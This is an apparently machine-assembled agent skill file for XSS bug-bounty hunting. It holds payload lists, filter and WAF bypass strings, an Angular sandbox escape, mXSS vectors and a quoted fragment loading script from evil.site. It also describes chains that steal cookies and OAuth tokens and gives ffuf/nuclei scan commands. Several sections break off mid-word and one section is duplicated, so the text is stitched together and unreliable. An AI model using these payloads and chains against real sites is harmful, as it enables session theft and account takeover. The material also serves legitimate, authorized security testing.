---
name: bbhunt-xss
description: "Use for reflected, stored, DOM and blind XSS; HTML, attribute, JS, URL and CSS contexts; markdown/rich-text pipelines; CSP and sanitizer bypasses. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Cross-Site Scripting — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Map the context before choosing a payload: HTML body, quoted/unquoted attribute, JS string, URL attribute, CSS url(), or template expression. Same input needs a different breakout in each.
2. Reflect a unique canary in every parameter, path segment, header (Referer, UA, X-Forwarded-*), cookie and JSON field; record which ones return decoded and which return escaped.
3. Determine the transformation order: sanitize-then-decode, decode-then-sanitize, and double-decode are the classic places a correct-looking filter fails.
4. For DOM XSS, trace the source (location.hash/search, postMessage, referrer, storage) to the sink with the browser debugger; confirm in a real browser, not just in the response text.
5. Test stored vectors in fields rendered by another role: support tickets, filenames, calendar invites, email subjects, admin notes. Blind XSS via a callback that captures URL, DOM and cookie is the proof primitive.
6. Identify the exact sanitizer/CSP in use, then look for known gadgets: JSONP endpoints, base-uri, dangling markup, allowed CDN, framework expression evaluation, mXSS namespace confusion.
7. Minimize to the shortest payload that still executes, and prove a security-relevant action (document.domain, cookie read where not HttpOnly, DOM write to another user's view).

### Signals

- User input reflected in text/html without encoding, or decoded after sanitizing
- Markdown, WYSIWYG, ticket, comment, profile, filename, webhook or admin-note fields
- DOM sinks: innerHTML, eval, setTimeout, document.write, jQuery .html(), postMessage, location.*
- A filter that strips one form of a tag but not encoded/namespace variants

### Kill criteria

- alert() in a context only the attacker can see (self-XSS) — no victim, no finding.
- Payload appears as text in the response but never executes in a real browser context.
- Execution requires the victim to paste into DevTools or disable a browser protection.

### Escalation chains

- Stored XSS in an admin view -> privileged action or session use -> ATO / data access.
- XSS -> CSRF token read -> state change that the token was meant to protect.
- XSS in a trusted origin -> credential phishing or OAuth code capture.

### Veteran tip

Corpus evidence shows stored/second-order delivery and encoding-bypass are far more common than trivial reflected tags — spend the budget on where the payload is *rendered*, not only where it lands.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Reflect a unique canary in every param, path segment, header (Referer, UA, X-Forwarded-*), cookie, and JSON field; look for unencoded reflection in text/html.
- Test URL sinks separately: href/src, iframe srcdoc, formaction, xlink:href, meta refresh, and CSS url().
- Stored vectors: profile name/company, filenames, support tickets, webhook URLs, calendar invites, email subjects, admin notes.
- DOM: trace location.hash/search, postMessage, document.referrer, and localStorage into innerHTML, eval, setTimeout, jQuery .html(), or framework sinks.
- Blind XSS: inject into admin-visible fields and log viewers with a callback that reports cookies, DOM, and URL.
- Check markdown/rich-text pipelines: HTML is often sanitized before markdown is rendered, or vice versa.

### Deeper checklist

- Map every reflection: URL params, path segments, headers (Referer/UA/X-Forwarded-*), cookies, JSON error messages.
- Classify the sink: HTML body, attribute, JS string, URL, CSS, or DOM (innerHTML, eval, location, postMessage).
- Try context-breaking payloads per sink, then encoding bypasses (double URL, unicode, HTML entities, mixed case).
- Test stored vectors: profile fields, filenames, support tickets, comments, webhooks, admin views, emails.
- Test DOM XSS via hash/search/postMessage and client-side routers; trace sources to sinks manually.
- Check sanitizer bypasses: DOMPurify versions, mutation XSS, allowed-tag/attr gaps, markdown-to-HTML pipelines.
- Try CSP bypass: JSONP endpoints, base-uri, dangling markup, script gadgets, whitelisted CDNs.
- Look for blind XSS in admin panels and log viewers; use a callback payload with context metadata.
- Confirm execution in a real browser (not just reflection) and capture the URL, payload, and impact.

### Autonomous Testing Priority

**Verify reflection before claiming XSS — encoding is everything.**

Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.

**Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.

**Try these contexts in order:**

1. **Inline script injection** (works when HTML context allows new tags):
   ```
   <script>alert(CANARY)</script>
   ```
   Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.

2. **Attribute event injection** (when `<` is filtered but attributes are injectable):
   ```
   " onmouseover="alert(CANARY)
   " onerror="alert(CANARY)
   " onload="alert(CANARY)
   ```

3. **URL/href context:**
   ```
   javascript:alert(CANARY)
   ```

**Distinguishing success from failure:**
- **Vulnerable:** response contains `<script>alert(` unescaped — browser would execute it
- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded
- **Blocked:** response is an error, or the reflected value is absent entirely

**

### Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally in the page (e.g., the word `javascript` is in every page's help-link hrefs), it's a false-positive trap and you need a different marker. This single check catches 80% of false-positive reflection reports.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SV

### Web-Research Methodology Additions (2026)

Online sources consulted: PortSwigger XSS cheat sheet (updated Oct 2026), PortSwigger Web Security Academy DOM-based topics, HackTricks XSS / DOM XSS / DOM-clobbering / XSSI pages, PayloadsAllTheThings XSS Injection, HackerOne "How to Find XSS" guide, Google bughunters mXSS writeup, OWASP DOM-based XSS Prevention Cheat Sheet. These are **additive** to the sections above — keep the earlier material.

### A. Discovery checklist the existing sections don't emphasize

1. **Canary every reflection point, not just parameters.** Inject a unique token into: query/body params, all path segments, every header (`Referer`, `User-Agent`, `X-Forwarded-*`, `X-Original-URL`, `Origin`), cookie names and values, JSON keys (not just values), multipart field names, filename metadata, and WebSocket frames. Then grep the raw response for the canary — note *which context* it lands in.
2. **Classify the context before choosing a payload** — HTML text, quoted/unquoted attribute, `<script>` body, JS string (single/double/template), URL attribute (`href`/`src`/`srcdoc`/`formaction`/`xlink:href`), CSS `url()`, or JSON-inside-script. The same canary needs a different escape per context.
3. **Run DOM Invader early** (Burp browser extension). Enable all sources/sinks, copy its generated canary, put that canary into every input, and let it highlight which sink receives it. Then hand-craft the final payload — the auto-generated one is often blocked. (HackerOne guide.)
4. **Test the "boring" surfaces:** 404/error pages, login/logout, password reset, search, file names, support tickets, calendar invites, email subjects, admin notes, webhook URLs, user-agent/customer-service consoles, and PDF/document generators.
5. **Check the response's charset/encoding.** If no `Content-Type` charset is set, browsers guess. ISO-2022-JP escape sequences can turn benign characters into `<script>`; UTF-7-style JSON tricks have historically escaped JSON context. (HackTricks, referenced research.)
6. **Diff dynamic JS file

### Signals and surfaces

### Signal

- Reports: **2,569** · paid: **546**
- Median bounty **$500** · p90 **$2,500** · max **$16,000** · total **$548,499**
- Median upvotes **11**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 57 | $92,530 | 3692 |
| Shopify | 129 | $83,350 | 5563 |
| Uber | 51 | $61,250 | 1642 |
| Mail.ru | 291 | $51,870 | 4740 |
| HackerOne | 33 | $27,750 | 3084 |
| Internet Bug Bounty | 17 | $17,265 | 498 |
| Reddit | 10 | $15,500 | 1343 |
| Open-Xchange | 34 | $14,400 | 366 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`q` `s` `search` `query` `lang` `next` `return` `url` `redirect` `callback` `name` `title` `bio` `message` `comment` `filename` `theme` `template`

### Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:

- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

### Attack Surface Signals

**URL Patterns:**
```
/admin*
/settings*
/wiki*
/reports*
?utm_source=
?redirect=
?q=
?search=
?callback=
?return_url=
/render*
/preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
X-XSS-Protection: 0
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

### Techniques, payloads and bypasses

### Payloads & probes

- HTML body -> `<svg onload=alert(document.domain)>` `<img src=x onerror=alert(1)>`
- Attribute -> `" autofocus onfocus=alert(1) x="` `' onmouseover='alert(1)`
- JS string -> `';alert(1)//` `\';alert(1)//` `</script><script>alert(1)</script>`
- URL sink -> `javascript:alert(1)` `data:text/html,<script>alert(1)</script>` `vbscript:msgbox(1)`
- Markdown -> `[x](javascript:alert(1))` `![x](x" onerror="alert(1))`
- Angular -> `{{constructor.constructor('alert(1)')()}}`
- mXSS -> `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`

### Payload bank

**89 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Filter & WAF bypass

```text
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</sCrIpT>
<<script>script>alert(1)<</script>/script>
<img/src=x/onerror=alert(1)>
<img src=x onerror=alert(1)////>
<svg%0aonload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E
&lt;script&gt;alert(1)&lt;/script&gt;
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=confirm`1`>
<svg onload=alert(1) >
<img src=x onerror=alert(1)%00>
<img src=x onerror=alert(1)<!-->
<img src=x onerror=alert(1)<!--->
<a href="&#x6a;avascript:alert(1)">x</a>
<img src=x onerror=&#x61;lert(1)>
```

### Bypass tricks

- Encode < as &lt;, %3C, \u003c, or fullwidth ＜; double-encode when the server decodes twice.
- Sanitizer gaps: data-* attributes, xlink:href, mXSS, DOMPurify version CVEs, sanitize-then-decode order.
- CSP bypass: JSONP endpoints, base-uri, dangling markup, whitelisted CDN, Angular/Vue gadgets.
- Filter bypass: `<scr<script>ipt>`, mixed case, null bytes, `<!-->`, HTML comments inside tags.
- Browser parsing quirks: `<svg><p><style><img src=x onerror=...>`, nested forms, namespace confusion.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Stored XSS in Wiki pages** — `#526325` · GitLab · $0 · ▲633
  > GitLab application converts the Markdown string `.alert(1);` to the href attribute `javascript:alert(1);`.
- **Stored XSS on imgur profile** — `#484434` · Imgur · $0 · ▲614
  > ”/ & lt; script alert(1)& lt;/scr ipt&gt”/ remove the underscores.
- **The return of the ＜** — `#639684` · Rockstar Games · $1,000 · ▲576
  > =[̕h+͓.＜script/src=//evil.site/poc.js .͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
- **[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure** — `#401793` · Grab · $0 · ▲552
  > I've found a set of possible deeplinks, one of them ( ) could lead that an arbtrary URL was opened in a built-in browser in activity using that code (should be used in an external browser/messenger)
- **XSS in steam react chat client** — `#409850` · Valve · $7,500 · ▲499
  > React has strong XSS mitigations but does not mitigate `javascript:` URI based XSS.
- **Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration** — `#968082` · TikTok · $0 · ▲473
  > While fuzzing, I discovered a URL parameter reflecting its value without being properly sanitized.
- **XSS vulnerable parameter in a location hash** — `#146336` · Slack · $0 · ▲455
  > https://slack.com/is ?cvo sid1=111\u0026;typ=55577]")%3balert(document.cookie)%3b//
- **Blind XSS on image upload** — `#1010466` · CS Money · $1,000 · ▲450
  > - The CSRF vulnerability make a request for suppo

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 18× | `javascript:` |
| 5× | `alert(document.domain)` |
| 5× | `<script>` |
| 5× | `<a>` |
| 4× | `alert(1)` |
| 4× | `escapeHTML()` |
| 3× | `<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;` |
| 3× | `<script>alert(document.domain)</script>` |
| 3× | `attacker@example.com` |
| 3× | `wp_targeted_link_rel()` |
| 3× | `alert()` |
| 3× | `<img>` |
| 3× | `<svg>` |
| 3× | `__proto__` |
| 2× | `javascript:alert(1);` |
| 2× | `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>` |
| 2× | `javascript://%0aalert(1)` |
| 2× | `<.*` |
| 2× | `\b \f \n \r \t` |
| 2× | `<%&lt;script/src=//...?` |

_...and 14 more sections in `references/unified-method.md`._

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.

---

_...and 1 more sections in `references/unified-method.md`._

### Escalation and related chains

### Escalation chains

- Cookie/token theft -> account takeover.
- XSS in admin context -> CSRF bypass -> privileged action.
- XSS + service worker -> persistent compromise.

### Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `web-cache` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `oauth-oidc` Disclosed Report Citation #19 and #20.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

_...and 5 more sections in `references/unified-method.md`._

### Tools and wordlists

### Tools

`dalfox` · `kxss` · `XSStrike` · `Burp DOM Invader` · `waybackurls | gf xss | httpx` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_xss.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_xss.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xss.txt` | 89 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xss_waf.txt` | 18 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_xss.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xss.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xss.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Run the DAST XSS templates against every reflected parameter; add cookies/headers for authenticated surfaces.

```sh
nuclei -u https://target -tags xss,csp-bypass \
       -severity low,medium,high,critical -rl 40 -o nuclei_xss.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xss -dast \
       -rl 40 -o nuclei_xss_xss.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_xss_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-xss`
- `hunting` — `xss`
- `cbh` — `hunt-xss`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
